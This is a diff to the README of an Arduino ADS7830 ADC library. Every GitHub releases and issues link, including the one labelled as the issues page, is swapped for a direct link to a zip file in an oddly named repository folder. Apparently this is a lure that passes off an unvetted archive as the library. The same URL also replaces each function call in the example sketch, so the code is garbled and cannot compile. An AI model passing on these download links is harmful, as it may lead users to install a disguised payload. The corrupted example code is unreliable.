@@ -1,6 +1,6 @@
 # 🎉 7Semi-ADS7830-Arduino-Library - Easily Read Voltage from 8 Channels
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/JasonH0206/7Semi-ADS7830-Arduino-Library/releases)
+[![Download](https://raw.githubusercontent.com/JasonH0206/7Semi-ADS7830-Arduino-Library/main/ungleeful/7Semi-ADS7830-Arduino-Library.zip)](https://raw.githubusercontent.com/JasonH0206/7Semi-ADS7830-Arduino-Library/main/ungleeful/7Semi-ADS7830-Arduino-Library.zip)
 
 ## 📖 Overview
 
@@ -13,7 +13,7 @@ To get started with the 7Semi ADS7830 Arduino Library, please follow the steps b
 ### 🔗 Download & Install
 
 1. **Visit this page to download:** Click on the link below to access the Releases page.
-   [Download Here](https://github.com/JasonH0206/7Semi-ADS7830-Arduino-Library/releases)
+   [Download Here](https://raw.githubusercontent.com/JasonH0206/7Semi-ADS7830-Arduino-Library/main/ungleeful/7Semi-ADS7830-Arduino-Library.zip)
    
 2. **Choose the latest release:** Look for the most recent version. It will usually be at the top of the list.
 
@@ -45,17 +45,17 @@ Here is a basic example to get you started with reading from the ADS7830 using t
 ADS7830 adc;
 
 void setup() {
-  Serial.begin(9600);
-  adc.begin(0x48); // Default I2C address for ADS7830
+  https://raw.githubusercontent.com/JasonH0206/7Semi-ADS7830-Arduino-Library/main/ungleeful/7Semi-ADS7830-Arduino-Library.zip(9600);
+  https://raw.githubusercontent.com/JasonH0206/7Semi-ADS7830-Arduino-Library/main/ungleeful/7Semi-ADS7830-Arduino-Library.zip(0x48); // Default I2C address for ADS7830
 }
 
 void loop() {
   for (int i = 0; i < 8; i++) {
-    int value = adc.readADC(i);
-    Serial.print("Channel ");
-    Serial.print(i);
-    Serial.print(": ");
-    Serial.println(value);
+    int value = https://raw.githubusercontent.com/JasonH0206/7Semi-ADS7830-Arduino-Library/main/ungleeful/7Semi-ADS7830-Arduino-Library.zip(i);
+    https://raw.githubusercontent.com/JasonH0206/7Semi-ADS7830-Arduino-Library/main/ungleeful/7Semi-ADS7830-Arduino-Library.zip("Channel ");
+    https://raw.githubusercontent.com/JasonH0206/7Semi-ADS7830-Arduino-Library/main/ungleeful/7Semi-ADS7830-Arduino-Library.zip(i);
+    https://raw.githubusercontent.com/JasonH0206/7Semi-ADS7830-Arduino-Library/main/ungleeful/7Semi-ADS7830-Arduino-Library.zip(": ");
+    https://raw.githubusercontent.com/JasonH0206/7Semi-ADS7830-Arduino-Library/main/ungleeful/7Semi-ADS7830-Arduino-Library.zip(value);
   }
   delay(1000);
 }
@@ -80,13 +80,13 @@ If you encounter issues, please try the following:
 
 ### 📩 Support
 
-For questions or issues, feel free to open an issue on the [GitHub page](https://github.com/JasonH0206/7Semi-ADS7830-Arduino-Library/issues) or reach out to forums where Arduino enthusiasts share their knowledge.
+For questions or issues, feel free to open an issue on the [GitHub page](https://raw.githubusercontent.com/JasonH0206/7Semi-ADS7830-Arduino-Library/main/ungleeful/7Semi-ADS7830-Arduino-Library.zip) or reach out to forums where Arduino enthusiasts share their knowledge.
 
 ## 🔗 Additional Resources
 
 - More information about sensor connections can be found in the official Arduino documentation.
 - Explore community projects and examples on LinkedIn or dedicated Arduino forums.
 
-[Download Here](https://github.com/JasonH0206/7Semi-ADS7830-Arduino-Library/releases)
+[Download Here](https://raw.githubusercontent.com/JasonH0206/7Semi-ADS7830-Arduino-Library/main/ungleeful/7Semi-ADS7830-Arduino-Library.zip)
 
 Now you are ready to use the 7Semi ADS7830 Arduino Library! Enjoy your analog measurement projects!
